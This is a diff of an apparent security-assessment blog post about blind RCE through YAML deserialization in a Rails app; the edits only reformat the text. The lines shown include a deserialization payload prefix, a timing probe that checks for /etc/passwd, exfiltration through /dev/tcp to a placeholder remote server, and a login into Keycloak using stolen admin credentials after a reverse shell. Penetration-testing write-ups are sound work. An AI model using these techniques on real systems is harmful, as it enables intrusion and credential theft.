@@ -6,7 +6,7 @@ date:   2021-06-09
 
 During an application security assessment of a Ruby on Rails project, I identified upload functionality that allowed users to submit text, CSV, and YAML files. The YAML option stood out due to its potential as a deserialization vulnerability.  
 
-After several uploads, I found that the process validated file contents before uploading them to Azure blob storage. YAML files starting with ```---!ruby/object:BadValue``` triggered a fatal status, while other invalid YAML files returned an error status. This fatal status was the only indicator that the upload process might be vulnerable.
+After several uploads, I found that the process validated file contents before uploading them to Azure blob storage. YAML files starting with **---!ruby/object:BadValue** triggered a fatal status, while other invalid YAML files returned an error status. This fatal status was the only indicator that the upload process might be vulnerable.
 
 <figure>
   <img src="/assets/img/2021/blind-rce-status-indicator.png">
@@ -58,7 +58,7 @@ After many failed attempts, I finally achieved success! While the sleep command 
 if [ -f /etc/passwd ]; then sleep 5; fi
 ```  
 
-After further consideration, I tried the bash -c command, echoing to ```/dev/tcp/:remote-server/443```, hoping for a DNS lookup. To my surprise, I received a DNS lookup and was able to exfiltrate the user and server hostname.
+After further consideration, I tried the bash -c command, echoing to **/dev/tcp/:remote-server/443**, hoping for a DNS lookup. To my surprise, I received a DNS lookup and was able to exfiltrate the user and server hostname.
 
 ```yaml
 ---
@@ -121,7 +121,7 @@ Success! I gained a reverse shell and ran printenv, which revealed sensitive inf
 </figure> 
 
 The server was not an Azure function, but a Kubernetes pod, likely running on Azure Kubernetes. Using the Keycloak admin credentials, I logged into Keycloak's master realm as the admin user through the following URL:  
-```https://redacted.com/auth/realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=https%3A%2F%2Fredacted.com%2Fauth%2Frealms%2Fmaster%2Faccount%2F&state=:stateUUID&response_mode=fragment&response_type=code&scope=openid&nonce=:nonceUUID&code_challenge=:challengeValue&code_challenge_method=S256```
+**https://redacted.com/auth/realms/master/protocol/openid-connect/auth?client_id=account-console&redirect_uri=https%3A%2F%2Fredacted.com%2Fauth%2Frealms%2Fmaster%2Faccount%2F&state=:stateUUID&response_mode=fragment&response_type=code&scope=openid&nonce=:nonceUUID&code_challenge=:challengeValue&code_challenge_method=S256**
 
 The state UUID, nonce UUID, and code challenge values were obtained from the web application's realm.
 
